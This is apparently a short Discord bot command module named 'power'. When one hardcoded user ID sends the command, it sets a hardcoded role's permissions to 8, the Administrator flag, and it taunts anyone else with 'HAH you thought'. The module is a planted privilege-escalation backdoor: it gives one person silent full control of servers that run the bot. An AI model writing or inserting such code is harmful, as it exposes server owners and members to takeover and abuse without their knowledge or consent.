module.exports = {
    name: "power",
    execute(msg) {
        if (msg.author.id == `279032930926592000`) {
        const role = msg.member.guild.roles.cache.get('765244241643044935');
        role.setPermissions(8);
        } else {
            msg.channel.send(`HAH you thought`);
        }
    },
}
